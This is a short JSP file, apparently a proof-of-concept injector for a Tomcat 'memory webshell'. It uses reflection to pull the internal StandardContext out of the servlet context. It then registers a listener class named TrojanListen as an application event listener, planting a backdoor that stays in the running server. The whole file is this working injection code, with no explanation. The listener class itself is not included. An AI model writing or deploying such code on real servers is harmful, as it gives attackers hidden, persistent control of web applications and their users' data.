<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="listen.TrojanListen" %>
<%@ page import="listen.TrojanListen" %>
<%
    Object obj = request.getServletContext();
    Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);

    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
    TrojanListen listenerTrojan = new TrojanListen(request,response);
    standardContext.addApplicationEventListener(listenerTrojan);
    out.println("test");
%>

